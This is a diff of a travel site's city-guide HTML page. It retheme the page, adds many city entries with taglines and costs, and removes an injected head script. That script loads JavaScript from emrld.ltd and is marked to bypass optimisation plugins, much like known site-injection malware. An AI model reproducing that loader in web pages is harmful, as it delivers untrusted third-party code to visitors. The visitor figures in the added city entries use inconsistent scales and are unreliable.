@@ -6,14 +6,7 @@
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16.png" />
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png" />
 
-  <script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1">
-  (function () {
-      var script = document.createElement("script");
-      script.async = 1;
-      script.src = 'https://emrld.ltd/NTQ4MDY2.js?t=548066';
-      document.head.appendChild(script);
-  })();
-</script>
+  <script src="consent.js"></script>
 
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -33,24 +26,24 @@
 <meta name="twitter:description" content="In-depth travel guides for 123 cities: neighborhoods, transit, costs, seasons and more.">
 <meta name="twitter:image" content="https://neverroamalone.com/images/og/og-default.jpg">
 <title>City Guides — Never Roam Alone</title>
-<link rel="stylesheet" href="fonts/amatic-sc.css" />
+<link rel="stylesheet" href="fonts/amatic-sc.css" /><link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,500;0,9..144,600;0,9..144,700;0,9..144,900;1,9..144,600&family=Work+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
   :root{
-    --ink:#1d2a32;--muted:#5b6b75;--sand:#f6f1e7;--green:#556B2F;--teal:#556B2F;
-    --coral:#C04020;--card:#fff;--shadow:0 10px 30px rgba(20,40,50,.12);--maxw:1100px;
+    --ink:#2b2417;--muted:#82755b;--sand:#ece2cc;--green:#3f5138;--teal:#3f5138;
+    --coral:#a8482a;--card:#f6efdd;--shadow:0 10px 30px rgba(20,40,50,.12);--maxw:1100px;
   }
   *{box-sizing:border-box}
   html{scroll-behavior:smooth}
   body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
     color:var(--ink);background:var(--sand);line-height:1.65}
-  h1,h2,h3{font-family:Georgia,"Times New Roman",serif}
+  h1,h2,h3{font-family:'Fraunces','Fraunces',Georgia,serif}
   a{color:inherit;text-decoration:none}
 
   /* Nav */
-  header.nav{position:sticky;top:0;z-index:50;background:rgba(246,241,231,.92);
-    backdrop-filter:blur(8px);border-bottom:1px solid rgba(85,107,47,.15)}
+  header.nav{position:sticky;top:0;z-index:50;background:rgba(236,226,204,.92);
+    backdrop-filter:blur(8px);border-bottom:1px solid rgba(63,81,56,.15)}
   .nav-inner{max-width:var(--maxw);margin:0 auto;padding:12px 22px;display:flex;align-items:center;justify-content:space-between}
-  .brand{display:flex;align-items:center;gap:10px;font-family:'Amatic SC',Georgia,serif;font-weight:700;font-size:1.85rem;line-height:1;color:#C04020}
+  .brand{display:flex;align-items:center;gap:10px;font-family:'Amatic SC','Fraunces',Georgia,serif;font-weight:700;font-size:1.85rem;line-height:1;color:#a8482a}
   .brand .logo{flex-shrink:0;display:block}
   .brand small{display:block;font-family:-apple-system,sans-serif;font-weight:500;font-size:.62rem;
     letter-spacing:.18em;text-transform:uppercase;color:var(--muted)}
@@ -64,7 +57,7 @@
   .page-hero .kicker{font-size:.75rem;font-weight:700;letter-spacing:.2em;text-transform:uppercase;
     color:rgba(255,255,255,.65);margin-bottom:14px}
   .page-hero h1{font-size:clamp(2.2rem,6vw,3.6rem);margin:0 0 14px;line-height:1.05}
-  .page-hero p{font-family:Georgia,serif;font-style:italic;font-size:1.18rem;
+  .page-hero p{font-family:'Fraunces',Georgia,serif;font-style:italic;font-size:1.18rem;
     color:rgba(255,255,255,.82);max-width:560px;margin:0 auto}
 
   /* Search / filter bar */
@@ -72,16 +65,16 @@
   .search-wrap{position:relative;flex:1;min-width:220px}
   .search-wrap svg{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:var(--muted);pointer-events:none}
   #city-search{width:100%;padding:12px 16px 12px 42px;font-size:.97rem;font-family:inherit;
-    border:2px solid rgba(85,107,47,.2);border-radius:12px;background:#fff;color:var(--ink);transition:border-color .2s}
+    border:2px solid rgba(63,81,56,.2);border-radius:12px;background:#fff;color:var(--ink);transition:border-color .2s}
   #city-search:focus{outline:none;border-color:var(--green)}
   .search-wrap .ac-list{list-style:none;margin:6px 0 0;padding:6px;position:absolute;z-index:30;left:0;right:0;top:100%;
-    background:#fff;border:1px solid rgba(85,107,47,.2);border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.12);max-height:290px;overflow:auto}
+    background:#fff;border:1px solid rgba(63,81,56,.2);border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.12);max-height:290px;overflow:auto}
   .search-wrap .ac-list li{padding:9px 12px;border-radius:8px;cursor:pointer;display:flex;justify-content:space-between;gap:12px;align-items:center}
-  .search-wrap .ac-list li:hover,.search-wrap .ac-list li.active{background:rgba(85,107,47,.08)}
+  .search-wrap .ac-list li:hover,.search-wrap .ac-list li.active{background:rgba(63,81,56,.08)}
   .search-wrap .ac-city{font-weight:600;font-size:.95rem}
   .search-wrap .ac-name{display:block;color:var(--muted);font-size:.78rem;font-weight:400}
   #city-sort{padding:12px 38px 12px 16px;font-size:.92rem;font-family:inherit;font-weight:600;
-    border:2px solid rgba(85,107,47,.2);border-radius:12px;background:#fff url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="%235b6b75" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>') no-repeat right 12px center;
+    border:2px solid rgba(63,81,56,.2);border-radius:12px;background:#fff url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="%235b6b75" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>') no-repeat right 12px center;
     background-size:15px;color:var(--ink);transition:border-color .2s;appearance:none;-webkit-appearance:none;cursor:pointer}
   #city-sort:focus{outline:none;border-color:var(--green)}
   .count-badge{font-size:.85rem;color:var(--muted);white-space:nowrap}
@@ -112,13 +105,13 @@
   .city-card h3{font-size:1.35rem;margin:0 0 8px;line-height:1.2}
   .city-card .fav-wrap{display:flex;flex-direction:column;align-items:flex-end;gap:2px;flex-shrink:0}
   .city-card .fav-label{font-size:.6rem;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
-  .city-card .fav-heart{border:2px solid rgba(192,64,32,.35);background:none;color:var(--coral);
+  .city-card .fav-heart{border:2px solid rgba(168,72,42,.35);background:none;color:var(--coral);
     width:32px;height:32px;border-radius:50%;font-size:1rem;line-height:1;cursor:pointer;
     display:flex;align-items:center;justify-content:center;transition:.15s;flex-shrink:0}
-  .city-card .fav-heart:hover{background:rgba(192,64,32,.1)}
+  .city-card .fav-heart:hover{background:rgba(168,72,42,.1)}
   .city-card .fav-heart.active{background:var(--coral);border-color:var(--coral);color:#fff}
   .city-card .fav-heart[disabled]{opacity:.6;cursor:default}
-  .city-card .tagline{font-family:Georgia,serif;font-style:italic;font-size:.92rem;
+  .city-card .tagline{font-family:'Fraunces',Georgia,serif;font-style:italic;font-size:.92rem;
     color:var(--muted);margin:0;flex:1}
   .city-card .card-actions{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-top:18px}
   .city-card .explore-btn{display:inline-flex;align-items:center;gap:7px;margin-top:0;
@@ -126,7 +119,7 @@
     padding:10px 20px;border-radius:30px;transition:background .2s}
   .city-card .explore-btn:hover{background:var(--coral)}
   .city-card .explore-btn svg{flex-shrink:0}
-  .city-card .cmp-toggle{margin-top:0;background:#fff;color:var(--green);border:1.5px solid rgba(85,107,47,.35);
+  .city-card .cmp-toggle{margin-top:0;background:#fff;color:var(--green);border:1.5px solid rgba(63,81,56,.35);
     font-weight:700;font-size:.82rem;padding:9px 16px;border-radius:30px;cursor:pointer;transition:.2s;font-family:inherit}
   .city-card .cmp-toggle:hover{border-color:var(--coral);color:var(--coral)}
   .city-card .cmp-toggle.active{background:var(--coral);border-color:var(--coral);color:#fff}
@@ -141,7 +134,7 @@
     padding:14px 18px;display:flex;align-items:center;gap:12px;flex-wrap:wrap;max-width:calc(100% - 16px)}
   .cmp-tray-label{font-weight:700;font-size:.82rem;color:var(--muted);white-space:nowrap}
   .cmp-tray-chips{display:flex;gap:8px;flex-wrap:wrap}
-  .cmp-chip{display:inline-flex;align-items:center;gap:6px;background:rgba(85,107,47,.1);color:var(--green);
+  .cmp-chip{display:inline-flex;align-items:center;gap:6px;background:rgba(63,81,56,.1);color:var(--green);
     font-weight:700;font-size:.82rem;padding:6px 8px 6px 12px;border-radius:20px}
   .cmp-chip-x{background:none;border:none;color:var(--green);font-size:1rem;line-height:1;cursor:pointer;padding:2px 4px}
   .cmp-chip-x:hover{color:var(--coral)}
@@ -151,14 +144,14 @@
   .cmp-tray-go{background:var(--green);color:#fff;font-weight:700;font-size:.85rem;white-space:nowrap;
     padding:11px 20px;border-radius:30px;transition:background .2s}
   .cmp-tray-go:hover{background:var(--coral)}
-  .cmp-tray-go.disabled{background:rgba(85,107,47,.35);cursor:default;pointer-events:none}
+  .cmp-tray-go.disabled{background:rgba(63,81,56,.35);cursor:default;pointer-events:none}
   @media(max-width:540px){
     .cmp-tray-inner{flex-direction:column;align-items:stretch;text-align:center}
     .cmp-tray-go{text-align:center}
   }
 
   footer{background:var(--green);color:#dfeee7;text-align:center;padding:40px 22px;margin-top:0}
-  footer .brand{justify-content:center;color:#C04020}
+  footer .brand{justify-content:center;color:#a8482a}
   footer .foot-links{margin-top:14px;display:flex;gap:18px;justify-content:center;flex-wrap:wrap}
   footer .foot-links a{color:#dfeee7;font-size:.85rem;font-weight:600;opacity:.9;border-bottom:1px solid transparent}
   footer .foot-links a:hover{color:#fff;border-color:var(--coral);opacity:1}
@@ -168,9 +161,24 @@
     nav.links{display:none}
     .city-grid{grid-template-columns:1fr}
   }
+
+  /* ================= EXPLORER THEME (overrides) ================= */
+  body{font-family:'Work Sans',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif!important;
+    background-color:var(--sand);background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='60' height='60'%3E%3Cg fill='none' stroke='%232b2417' stroke-opacity='0.05' stroke-width='1'%3E%3Cpath d='M0 0H60M0 0V60'/%3E%3C/g%3E%3C/svg%3E"),url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='500' height='500' viewBox='0 0 500 500'%3E%3Cg fill='none' stroke='%233f5138' stroke-opacity='0.06' stroke-width='1.4'%3E%3Cpath d='M70 250c0-90 70-155 165-155s195 60 195 155-95 165-195 165S70 340 70 250z'/%3E%3Cpath d='M120 250c0-62 50-108 115-108s140 44 140 108-70 122-140 122-115-60-115-122z'/%3E%3Cpath d='M170 250c0-36 28-62 65-62s85 26 85 62-42 72-85 72-65-36-65-72z'/%3E%3C/g%3E%3C/svg%3E");background-position:0 0,center}
+  h1,h2,h3{font-family:'Fraunces',Georgia,serif!important;letter-spacing:-.01em}
+  header.nav{border-bottom:1px solid var(--ink)}
+  .brand small{font-family:'Work Sans',monospace;letter-spacing:.22em}
+  nav.links a:hover{color:var(--coral);border-color:#b0802f}
+  .fact,.tile,.tcard,.dtcard,.stay-card,.hood,.card{border:1px solid var(--ink);border-radius:3px}
+  .form-card,.visa-panel,.gate,.legal,.toc,.city-card,.cmp-card,.qadmin,.ns-card,.travel-map,.cover-strip,.suggest,.empty,.side-card,.roamers-card,.cal-wrap,.qcard{border-radius:3px}
+  .form-card,.visa-panel,.gate,.legal,.toc,.city-card,.cmp-card,.qadmin,.ns-card,.side-card{border:1px solid var(--ink)}
+  .tile .photo,.hood-hero,.g-cell,.cover{filter:sepia(.16) saturate(.96)}
+  footer{background:#2c3a27;border-top:5px solid #b0802f}
+  footer .brand{color:#c99a45}
 </style>
 </head>
 <body>
+<svg style="position:absolute;width:0;height:0" aria-hidden="true"><symbol id="compass" viewBox="0 0 100 100"><circle cx="50" cy="50" r="47" fill="none" stroke="currentColor" stroke-width="1.6"/><circle cx="50" cy="50" r="39" fill="none" stroke="currentColor" stroke-width="0.8" stroke-dasharray="1.5 3"/><polygon points="50,6 57,50 50,50" fill="#a8482a"/><polygon points="50,6 43,50 50,50" fill="#8a3a20"/><polygon points="50,94 57,50 50,50" fill="currentColor" opacity=".85"/><polygon points="50,94 43,50 50,50" fill="currentColor" opacity=".55"/><polygon points="94,50 50,43 50,50" fill="currentColor" opacity=".7"/><polygon points="94,50 50,57 50,50" fill="currentColor" opacity=".5"/><polygon points="6,50 50,43 50,50" fill="currentColor" opacity=".7"/><polygon points="6,50 50,57 50,50" fill="currentColor" opacity=".5"/><circle cx="50" cy="50" r="3.5" fill="#a8482a"/></symbol></svg>
 
 <header class="nav">
   <div class="nav-inner">
@@ -240,6 +248,46 @@
 <script src="city-photos.js"></script>
 <script>
 const CITIES = [
+  {"city":"Yokohama","country":"Japan","visitors":2.5,"tagline":"Japan's cosmopolitan port city, where a futuristic bay skyline meets the country's largest Chinatown.","cost":{"hotel":120,"meal":12,"taxi":8}},
+  {"city":"Xiamen","country":"China","visitors":90,"tagline":"Fujian's island city of colonial Gulangyu, sea breezes, and oolong tea.","cost":{"hotel":60,"meal":9,"taxi":5}},
+  {"city":"Wuxi","country":"China","visitors":20,"tagline":"Canal town on Lake Tai, ringed by classical gardens, cherry blossoms, and a giant hilltop Buddha.","cost":{"hotel":60,"meal":8,"taxi":3}},
+  {"city":"Tianshui","country":"China","visitors":2.5,"tagline":"Silk Road city of Gansu, guardian of the Maijishan grottoes.","cost":{"hotel":40,"meal":6,"taxi":3}},
+  {"city":"Qingdao","country":"China","visitors":8,"tagline":"German colonial charm, Tsingtao beer, and Yellow Sea beaches on China's Shandong coast.","cost":{"hotel":55,"meal":8,"taxi":3}},
+  {"city":"Ningbo","country":"China","visitors":3.5,"tagline":"One of the world's busiest ports, where an ancient library and the Old Bund meet the East China Sea.","cost":{"hotel":55,"meal":8,"taxi":4}},
+  {"city":"Kunming","country":"China","visitors":60,"tagline":"China's mild-weather 'Spring City' and the gateway to Yunnan and the Stone Forest.","cost":{"hotel":50,"meal":6,"taxi":3}},
+  {"city":"Kano","country":"Nigeria","visitors":0.3,"tagline":"Ancient Sahel trading city of mud-walled markets, indigo dye pits, and Hausa heritage.","cost":{"hotel":70,"meal":5,"taxi":3}},
+  {"city":"Ibadan","country":"Nigeria","visitors":0.3,"tagline":"Nigeria's vast Yoruba metropolis of rust-red rooftops, cocoa-trade history, and its first university.","cost":{"hotel":55,"meal":5,"taxi":3}},
+  {"city":"Hyderabad","country":"India","visitors":3.0,"tagline":"City of pearls and biryani, where Nizami palaces meet the glass towers of HITEC City.","cost":{"hotel":45,"meal":4,"taxi":3}},
+  {"city":"Foshan","country":"China","visitors":2.5,"tagline":"Guangdong's kung-fu heartland of Lingnan temples, ceramics, and Cantonese feasts.","cost":{"hotel":55,"meal":6,"taxi":3}},
+  {"city":"Chittagong","country":"Bangladesh","visitors":0.5,"tagline":"Bangladesh's port city of hills, sea, and Mezban feasts.","cost":{"hotel":55,"meal":4,"taxi":3}},
+  {"city":"Ankara","country":"Türkiye","visitors":1.0,"tagline":"Türkiye's modernist capital, from Atatürk's mausoleum to an ancient hilltop citadel.","cost":{"hotel":55,"meal":9,"taxi":5}},
+  {"city":"Alexandria","country":"Egypt","visitors":1.5,"tagline":"Egypt's Mediterranean pearl, where the ghost of the ancient Library meets a sea-swept corniche.","cost":{"hotel":70,"meal":6,"taxi":3}},
+  {"city":"Ahmedabad","country":"India","visitors":5.5,"tagline":"India's first UNESCO World Heritage city — Gandhi's ashram, carved-wood pols, and Gujarati street food.","cost":{"hotel":40,"meal":4,"taxi":3}},
+  {"city":"Zhengzhou","country":"China","visitors":15,"tagline":"Henan's ancient crossroads where China's rail lines and dynasties converge, gateway to Shaolin and the Yellow River.","cost":{"hotel":55,"meal":6,"taxi":3}},
+  {"city":"Tai'an","country":"China","visitors":9,"tagline":"Gateway to sacred Mount Tai, holiest of China's five great peaks.","cost":{"hotel":45,"meal":6,"taxi":3}},
+  {"city":"Suzhou","country":"China","visitors":100,"tagline":"The 'Venice of the East' - classical gardens, silk, and canal-woven old lanes an hour from Shanghai.","cost":{"hotel":70,"meal":8,"taxi":4}},
+  {"city":"Shenyang","country":"China","visitors":1.5,"tagline":"Manchuria's old capital, where an imperial palace meets industrial reinvention.","cost":{"hotel":55,"meal":6,"taxi":3}},
+  {"city":"Shantou","country":"China","visitors":30,"tagline":"Teochew heartland of gongfu tea, seafood feasts, and arcade-lined old streets on the South China Sea.","cost":{"hotel":45,"meal":6,"taxi":3}},
+  {"city":"Saint Petersburg","country":"Russia","visitors":9.0,"tagline":"Russia's imperial capital of palaces, the Hermitage, and summer White Nights.","cost":{"hotel":55,"meal":12,"taxi":4}},
+  {"city":"Lahore","country":"Pakistan","visitors":0.8,"tagline":"Pakistan's cultural heart, where Mughal grandeur meets nonstop food streets.","cost":{"hotel":55,"meal":5,"taxi":3}},
+  {"city":"Kolkata","country":"India","visitors":2.0,"tagline":"The City of Joy — India's cultural capital of literature, art, adda, and unrivalled street food.","cost":{"hotel":45,"meal":5,"taxi":3}},
+  {"city":"Jinan","country":"China","visitors":9,"tagline":"China's City of Springs, where bubbling waters, willow-lined lakes, and hearty Shandong flavors meet.","cost":{"hotel":55,"meal":6,"taxi":3}},
+  {"city":"Harbin","country":"China","visitors":9.5,"tagline":"China's frozen north, where ice cities glow and Russian domes meet Manchurian street food.","cost":{"hotel":55,"meal":7,"taxi":3}},
+  {"city":"Hangzhou","country":"China","visitors":30,"tagline":"West Lake serenity and Alibaba ambition, wrapped in tea hills and canals.","cost":{"hotel":90,"meal":10,"taxi":5}},
+  {"city":"Dalian","country":"China","visitors":3,"tagline":"Breezy Yellow Sea port where Russian and Japanese pasts meet China's beach-resort playground.","cost":{"hotel":60,"meal":8,"taxi":4}},
+  {"city":"Chennai","country":"India","visitors":5.0,"tagline":"South India's Dravidian capital of temples, filter coffee, and the world's second-longest urban beach.","cost":{"hotel":45,"meal":4,"taxi":3}},
+  {"city":"Changchun","country":"China","visitors":3.0,"tagline":"China's Motor City on the Manchurian plain—auto plants, film studios, and long snowbound winters.","cost":{"hotel":45,"meal":6,"taxi":3}},
+  {"city":"Bengaluru","country":"India","visitors":2.0,"tagline":"India's Garden City turned tech capital — craft beer, startups, and near-perfect weather.","cost":{"hotel":55,"meal":6,"taxi":3}},
+  {"city":"Xi'an","country":"China","visitors":30,"tagline":"Ancient Silk Road capital of the Terracotta Army, city walls, and dumpling feasts.","cost":{"hotel":55,"meal":6,"taxi":3}},
+  {"city":"Wuhan","country":"China","visitors":30,"tagline":"River city of a thousand lakes, hot-dry noodles, and the Yellow Crane Tower.","cost":{"hotel":55,"meal":8,"taxi":4}},
+  {"city":"Tianjin","country":"China","visitors":2.5,"tagline":"China's treaty-port gateway where European villas meet a booming Bohai skyline.","cost":{"hotel":55,"meal":6,"taxi":3}},
+  {"city":"Nanjing","country":"China","visitors":12,"tagline":"Ancient southern capital of dynasties, city walls, and Yangtze lore.","cost":{"hotel":55,"meal":6,"taxi":3}},
+  {"city":"Nanchong","country":"China","visitors":1.5,"tagline":"Sichuan's silk city on the Jialing, steeped in Three Kingdoms lore.","cost":{"hotel":40,"meal":6,"taxi":3}},
+  {"city":"Mumbai","country":"India","visitors":6,"tagline":"India's maximum city, where Bollywood dreams meet colonial grandeur and the Arabian Sea.","cost":{"hotel":75,"meal":6,"taxi":4}},
+  {"city":"Jakarta","country":"Indonesia","visitors":2.5,"tagline":"Indonesia's sprawling capital of malls, markets, and endless motorbikes.","cost":{"hotel":50,"meal":5,"taxi":5}},
+  {"city":"Dongguan","country":"China","visitors":4.0,"tagline":"Sprawling Pearl River factory metropolis wedged between Guangzhou and Shenzhen.","cost":{"hotel":55,"meal":6,"taxi":4}},
+  {"city":"Chongqing","country":"China","visitors":65,"tagline":"Cyberpunk mountain metropolis of fog, hot pot, and cities stacked along the Yangtze.","cost":{"hotel":55,"meal":8,"taxi":4}},
+  {"city":"Chengdu","country":"China","visitors":6.5,"tagline":"Laid-back Sichuan capital of pandas, teahouses, and mouth-numbing hotpot.","cost":{"hotel":60,"meal":6,"taxi":3}},
   {"city":"Ibiza","country":"Spain","visitors":3.5,"tagline":"White-walled old town by day, world capital of clubbing by night.","cost":{"hotel":140,"meal":30,"taxi":15}},
   {"city":"Victoria Falls","country":"Zimbabwe","visitors":0.6,"tagline":"Where the Zambezi thunders into mist and rainbows.","cost":{"hotel":130,"meal":15,"taxi":6}},
   {"city":"Lusaka","country":"Zambia","visitors":1.3,"tagline":"Zambia's leafy capital and gateway to safari country.","cost":{"hotel":90,"meal":10,"taxi":7}},
